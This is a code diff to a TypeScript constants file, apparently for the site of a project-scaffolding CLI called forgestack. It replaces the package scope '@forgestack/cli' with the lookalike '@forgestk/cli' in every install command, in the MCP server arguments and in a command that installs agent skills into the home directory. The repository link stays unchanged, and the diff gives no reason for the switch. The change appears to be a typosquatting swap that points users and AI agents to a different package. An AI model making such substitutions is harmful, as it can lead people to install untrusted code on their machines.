@@ -1,6 +1,6 @@
 export const REPO = 'https://github.com/umesh-saini/forgestack';
-export const CREATE_CMD = 'npx -p @forgestack/cli create-forgestack-app my-app';
-const MCP_ARGS = ['-y', '-p', '@forgestack/cli', 'forgestack-mcp'];
+export const CREATE_CMD = 'npx -p @forgestk/cli create-forgestack-app my-app';
+const MCP_ARGS = ['-y', '-p', '@forgestk/cli', 'forgestack-mcp'];
 
 export const STATS = [
   { value: '636k+', label: 'option combinations checked on every push' },
@@ -96,16 +96,16 @@ export const LABELS: Record<string, string> = {
 };
 
 export const CLI_EXAMPLES = [
-  { title: 'Interactive wizard', cmd: 'npx -p @forgestack/cli create-forgestack-app my-app' },
-  { title: 'Recommended defaults, no prompts', cmd: 'npx -p @forgestack/cli create-forgestack-app my-app --yes' },
-  { title: 'Scaffold into the current folder', cmd: 'npx -p @forgestack/cli create-forgestack-app . --yes' },
-  { title: 'Start from a curated template', cmd: 'npx -p @forgestack/cli create-forgestack-app my-app --template nextjs-fullstack' },
+  { title: 'Interactive wizard', cmd: 'npx -p @forgestk/cli create-forgestack-app my-app' },
+  { title: 'Recommended defaults, no prompts', cmd: 'npx -p @forgestk/cli create-forgestack-app my-app --yes' },
+  { title: 'Scaffold into the current folder', cmd: 'npx -p @forgestk/cli create-forgestack-app . --yes' },
+  { title: 'Start from a curated template', cmd: 'npx -p @forgestk/cli create-forgestack-app my-app --template nextjs-fullstack' },
   {
     title: 'Pick every layer yourself',
-    cmd: 'npx -p @forgestack/cli create-forgestack-app my-api \\\n  --topology standalone-be --be hono --db postgres --orm drizzle \\\n  --auth better-auth --linter biome --pm npm --yes',
+    cmd: 'npx -p @forgestk/cli create-forgestack-app my-api \\\n  --topology standalone-be --be hono --db postgres --orm drizzle \\\n  --auth better-auth --linter biome --pm npm --yes',
   },
-  { title: 'List curated templates', cmd: 'npx -p @forgestack/cli forgestack template list' },
-  { title: 'Install globally (shorter commands)', cmd: 'npm i -g @forgestack/cli\ncreate-forgestack-app my-app' },
+  { title: 'List curated templates', cmd: 'npx -p @forgestk/cli forgestack template list' },
+  { title: 'Install globally (shorter commands)', cmd: 'npm i -g @forgestk/cli\ncreate-forgestack-app my-app' },
 ];
 
 const json = (o: unknown) => JSON.stringify(o, null, 2);
@@ -136,7 +136,7 @@ export const AI_TOOLS = [
 export const AI_PROMPT =
   'Use the forgestack MCP tools to scaffold a pnpm monorepo called "shop" with React, Fastify, PostgreSQL + Drizzle, Better-Auth and tRPC in ~/code/shop, then install dependencies.';
 
-export const SKILLS_CMD = 'npx -p @forgestack/cli forgestack init-skills ~ --tools claude,codex';
+export const SKILLS_CMD = 'npx -p @forgestk/cli forgestack init-skills ~ --tools claude,codex';
 
 /** Estimates. Output sizes are measured from generated projects; session totals assume an agent that
  *  re-sends its context each step and goes through a few build-fix loops. */
